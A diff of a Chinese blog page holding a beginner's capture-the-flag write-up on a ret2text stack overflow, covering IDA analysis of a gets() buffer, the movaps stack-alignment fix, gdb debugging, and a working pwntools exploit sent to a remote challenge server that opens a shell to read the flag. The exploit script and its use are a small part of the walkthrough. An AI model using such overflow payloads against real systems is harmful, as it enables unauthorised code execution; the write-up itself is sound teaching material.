@@ -19,27 +19,29 @@
   <meta name="author" content="Nefelibata">
   <meta name="keywords" content="">
   
-    <meta name="description" content="ret2text 1.先托入ide中查看  2.拖入ida中： ![image-20241127192619944](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;azjzfyuan&#x2F;images&#x2F;202411271926129.png  1.分析函数： 确认buf距离栈底20个字节（h为16进制）     3.写脚本攻击服务器 先在本地运行，（因为本地可以调试） 1p &#x3D; proces">
+    <meta name="description" content="ret2text 1.先托入ide中查看  2.拖入ida中：  1.分析函数： 确认buf距离栈底20个字节（h为16进制） gets函数可读入任意长度的数据     因此要将地址改为dt_gift函数的地址 3.写脚本攻击服务器 先在本地运行，（因为本地可以调试） 1p &#x3D; process(&quot;.&#x2F;文件名&quot;)  （文件名大小写没关系） payload: ①距离为 0x20 ②">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn初体验">
 <meta property="og:url" content="http://example.com/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/index.html">
 <meta property="og:site_name" content="星期六不上发条">
-<meta property="og:description" content="ret2text 1.先托入ide中查看  2.拖入ida中： ![image-20241127192619944](https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;azjzfyuan&#x2F;images&#x2F;202411271926129.png  1.分析函数： 确认buf距离栈底20个字节（h为16进制）     3.写脚本攻击服务器 先在本地运行，（因为本地可以调试） 1p &#x3D; proces">
+<meta property="og:description" content="ret2text 1.先托入ide中查看  2.拖入ida中：  1.分析函数： 确认buf距离栈底20个字节（h为16进制） gets函数可读入任意长度的数据     因此要将地址改为dt_gift函数的地址 3.写脚本攻击服务器 先在本地运行，（因为本地可以调试） 1p &#x3D; process(&quot;.&#x2F;文件名&quot;)  （文件名大小写没关系） payload: ①距离为 0x20 ②">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272027539.png">
-<meta property="og:image" content="http://example.com/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users/hp/AppData/Roaming/Typora/typora-user-images/image-20241127203614027.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272346961.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271931584.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272044812.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272054077.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272106106.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272107049.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281722375.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281722973.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281723933.png">
 <meta property="og:image" content="http://example.com/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users/hp/AppData/Roaming/Typora/typora-user-images/image-20241127213538953.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272139275.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272143470.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272146052.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272150785.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281726908.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281726824.png">
 <meta property="article:published_time" content="2024-11-27T11:21:32.000Z">
-<meta property="article:modified_time" content="2024-11-27T13:50:39.855Z">
+<meta property="article:modified_time" content="2024-11-28T09:40:00.990Z">
 <meta property="article:author" content="Nefelibata">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272027539.png">
@@ -235,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          246 字
+          353 字
         
       </span>
     
@@ -292,14 +294,15 @@
 <p>1.先托入ide中查看</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272027539.png" srcset="/img/loading.gif" lazyload alt="image-20241127202727338"></p>
 <p>2.拖入ida中：</p>
-<p>![image-20241127192619944](<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271926129.png">https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271926129.png</a></p>
-<p><img src="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20241127203614027.png" srcset="/img/loading.gif" lazyload alt="image-20241127203614027"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272346961.png" srcset="/img/loading.gif" lazyload alt="image-20241127203614027"></p>
 <p>1.分析函数：</p>
 <p>确认buf距离栈底20个字节（h为16进制）</p>
+<p>gets函数可读入任意长度的数据</p>
 <ol start="2">
 <li></li>
 </ol>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411271931584.png" srcset="/img/loading.gif" lazyload alt="image-20241127193117448"></p>
+<p>因此要将地址改为dt_gift函数的地址</p>
 <p>3.写脚本攻击服务器</p>
 <p>先在本地运行，（因为本地可以调试）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p = process(<span class="hljs-string">&quot;./文件名&quot;</span>)<br></code></pre></td></tr></table></figure>
@@ -308,39 +311,45 @@
 <p>payload:</p>
 <p>①距离为 0x20</p>
 <p>②地址要加 0x！！！！！</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;222.22.91.49&quot;</span>,<span class="hljs-string">&quot;32783&quot;</span>)<br><span class="hljs-comment"># gdb.attach(p,&#x27;b*0x00000000004011A2&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> +p64(<span class="hljs-number">0x00000000004011A9</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
-
-
-
-<p>3：本题涉及栈平衡，因此这个地址不正确</p>
+<p>③“junk”占4个字节</p>
+<p>3：本题涉及栈平衡因此这个地址不正确</p>
 <p>刚开始写的：(有两处错误)</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272044812.png" srcset="/img/loading.gif" lazyload alt="image-20241127204433735"></p>
 <p>开始写：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272054077.png" srcset="/img/loading.gif" lazyload alt="image-20241127205438921"></p>
 <p>接着写payload:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281722375.png" srcset="/img/loading.gif" lazyload alt="image-20241128172158249"></p>
 <p>发现失败了：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272106106.png" srcset="/img/loading.gif" lazyload alt="image-20241127210607968"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281722973.png" srcset="/img/loading.gif" lazyload alt="image-20241128172235931"></p>
 <p>开始调试：</p>
-<p>添加：</p>
-<p>leave</p>
+<p>添加：（leave）</p>
+<p>gdb.attach是一个函数，会连接当前运行的进程p</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">gdb<span class="hljs-selector-class">.attach</span>(<span class="hljs-selector-tag">p</span>,<span class="hljs-string">&#x27;b*0x00000000004011A2&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272107049.png" srcset="/img/loading.gif" lazyload alt="image-20241127210748905"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281723933.png" srcset="/img/loading.gif" lazyload alt="image-20241128172312892"></p>
 <p>运行：</p>
 <p>这个时候在pwning文件里面打开终端</p>
-<p>输入t（进入分屏）（CTRL＋d)</p>
+<p>先输入t（进入分屏）（CTRL＋d退出)</p>
 <p><img src="/2024/11/27/pwn%E5%88%9D%E4%BD%93%E9%AA%8C/Users\hp\AppData\Roaming\Typora\typora-user-images\image-20241127213538953.png" srcset="/img/loading.gif" lazyload alt="image-20241127213538953"></p>
-<p>输入c&#x2F;ni</p>
+<p>输入c&#x2F;ni（c按了两次）</p>
 <p>发现卡住了：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272139275.png" srcset="/img/loading.gif" lazyload></p>
 <p>这个时候发现movaps栈不平衡,</p>
-<p>回到IDA找到</p>
-<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272143470.png" srcset="/img/loading.gif" lazyload alt="image-20241127214303408"></p>
+<p>回到IDA找到（）</p>
 <p>改地址：00000000004011A9</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272146052.png" srcset="/img/loading.gif" lazyload alt="image-20241127214607982"></p>
 <p>改一下，运行，</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411272150785.png" srcset="/img/loading.gif" lazyload alt="image-20241127215023656"></p>
-<p>改成远端就可以了</p>
+<p>发现得到了一个flag,但提交上去显示错误，这个时候再看一看我们写的脚本：发现需要把地址改成远端</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281726908.png" srcset="/img/loading.gif" lazyload alt="image-20241128172659866"></p>
+<p>下面的是正确的exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;222.22.91.49&quot;</span>,<span class="hljs-string">&quot;32783&quot;</span>)<br><span class="hljs-comment"># gdb.attach(p,&#x27;b*0x00000000004011A2&#x27;)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> +p64(<span class="hljs-number">0x00000000004011A9</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>之后保存，f5运行</p>
+<p>输入ls</p>
+<p>输cat flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202411281726824.png" srcset="/img/loading.gif" lazyload alt="image-20241128172635776"></p>
+<p>欧克欧克，找到了找到了</p>
 
                 
               </div>
